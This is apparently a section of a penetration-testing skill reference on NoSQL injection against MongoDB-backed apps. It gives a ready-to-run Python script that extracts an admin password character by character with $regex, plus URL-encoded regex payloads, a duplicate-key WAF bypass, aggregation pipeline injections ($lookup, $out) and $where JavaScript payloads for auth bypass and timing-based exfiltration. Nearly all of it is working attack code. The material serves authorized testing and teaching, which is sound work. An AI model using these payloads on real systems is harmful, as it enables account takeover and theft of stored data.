# nosql-injection technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 13. BLIND NoSQL EXTRACTION AUTOMATION

### $regex Character-by-Character Extraction (Python Template)

```python
import requests
import string

url = "http://target/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
password = ""

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{c}.*"
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            found = True
            print(f"Found: {password}")
            break
    if not found:
        break

print(f"Final password: {password}")
```

### $regex via URL-encoded GET Parameters

```
username=admin&password[$regex]=^a.*
username=admin&password[$regex]=^ab.*
# Iterate through charset until login succeeds
```

### Duplicate Key Bypass

```json
// When app checks one key but processes another:
{"id": "10", "id": "100"}
// JSON parsers typically use last occurrence
// Bypass: WAF validates id=10, app processes id=100
```

---

## 14. AGGREGATION PIPELINE INJECTION

When user input reaches MongoDB aggregation pipeline stages:

```javascript
// If user controls $match stage:
db.collection.aggregate([
  { $match: { user: INPUT } }  // INPUT from user
])

// Injection: provide object instead of string
// INPUT = {"$gt": ""} → matches all documents

// $lookup for cross-collection data access:
// If $lookup stage is injectable:
{ $lookup: {
    from: "admin_users",       // attacker-chosen collection
    localField: "user_id",
    foreignField: "_id",
    as: "leaked"
}}

// $out to write results to new collection:
{ $out: "public_collection" }  // Write query results to accessible collection
```

### $where JavaScript Execution

```javascript
// $where allows arbitrary JavaScript (DANGEROUS):
db.users.find({ $where: "this.username == 'admin'" })

// If input reaches $where:
// Injection: ' || 1==1 || '
// Or: '; return true; var x='
// Time-based: '; sleep(5000); var x='
// Data exfil: '; if(this.password[0]=='a'){sleep(5000)}; var x='
```

**Reference**: Soroush Dalili — "MongoDB NoSQL Injection with Aggregation Pipelines" (2024)

**Note:** `$where` runs JavaScript on the server. Besides logic abuse and timing oracles, older MongoDB builds without a tight V8 sandbox historically raised RCE concerns; prefer treating any `$where` sink as high risk.
